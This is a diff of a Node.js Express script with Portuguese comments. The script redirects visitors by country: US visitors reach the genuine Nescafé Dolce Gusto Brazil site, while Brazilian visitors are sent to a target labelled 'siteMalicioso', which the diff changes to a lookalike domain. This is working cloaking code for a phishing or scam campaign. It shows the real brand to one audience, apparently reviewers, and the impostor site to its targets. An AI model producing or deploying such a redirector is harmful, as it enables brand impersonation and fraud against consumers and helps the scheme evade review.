@@ -1,35 +1,20 @@
-const express = require('express');
-const axios = require('axios');
-const requestIp = require('request-ip');
+const express = require("express");
+const axios = require("axios");
+const requestIp = require("request-ip");
 
 const app = express();
 const port = 3000;
 
-
-
-
-
-
-
-
-/* ---------------------------------- Modifique abaixo */ 
+/* ---------------------------------- Modifique abaixo */
 const siteReal = "https://www.nescafe-dolcegusto.com.br/";
 
-const siteMalicioso = "https://pranx.com/blue-death/"
-/* ----------------------------------*/ 
-
-
-
-
-
-
-
-
+const siteMalicioso = "https://nescafedolcegusto.pt/";
+/* ----------------------------------*/
 
 // Adiciona middleware para obter o endereço IP do cliente
 app.use(requestIp.mw());
 
-app.get('/', async (req, res) => {
+app.get("/", async (req, res) => {
   const userIP = req.clientIp;
 
   try {
@@ -38,16 +23,18 @@ app.get('/', async (req, res) => {
     const data = response.data;
 
     // Redireciona com base no país
-    if (data.countryCode === 'US') {
+    if (data.countryCode === "US") {
       res.redirect(siteReal);
-    } else if (data.countryCode === 'BR') {
+    } else if (data.countryCode === "BR") {
       res.redirect(siteMalicioso);
     } else {
-      res.send('Bem-vindo! Seu país não foi configurado para redirecionamento.');
+      res.send(
+        "Bem-vindo! Seu país não foi configurado para redirecionamento."
+      );
     }
   } catch (error) {
     console.error(error.message);
-    res.status(500).send('Erro ao obter informações de localização.');
+    res.status(500).send("Erro ao obter informações de localização.");
   }
 });
 
